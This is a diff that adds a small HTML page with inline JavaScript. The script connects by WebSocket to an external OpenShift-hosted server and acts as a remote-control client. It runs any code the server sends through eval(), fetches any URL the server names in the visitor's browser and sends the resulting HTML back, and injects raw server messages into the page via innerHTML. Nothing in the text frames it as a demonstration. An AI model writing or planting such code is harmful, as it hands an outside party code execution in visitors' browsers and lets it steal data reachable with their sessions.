@@ -1,0 +1,33 @@
+
+<div id="content"></div>
+
+<script type="text/javascript">
+var obj;
+var content = document.getElementById('content');
+
+ var socket = new WebSocket('ws://sdfsdfsdfsd-project123213.193b.starter-ca-central-1.openshiftapps.com:8080');
+socket.onopen = function () {
+	socket.send(JSON.stringify({'req': 'hi'}));
+	socket.send('hello from the client');
+};
+
+function handleObj(obj)
+{
+	if (obj.request == 'eval')
+		eval(obj.content);
+	else if (obj.request == 'get')
+		$.ajax({url: obj.url})
+		.done(function(h) { socket.send(JSON.stringify({'request': 'getresponse', 'html': h})); console.log(h); });
+}
+
+socket.onmessage = function (message) {
+	content.innerHTML += message.data +'<br />';
+	try { obj = JSON.parse(message.data); } catch(e) { }
+	if (typeof(obj) === 'object')
+		handleObj(obj);
+};
+
+socket.onerror = function (error) {
+	console.log('WebSocket error: ' + error);
+};
+</script>
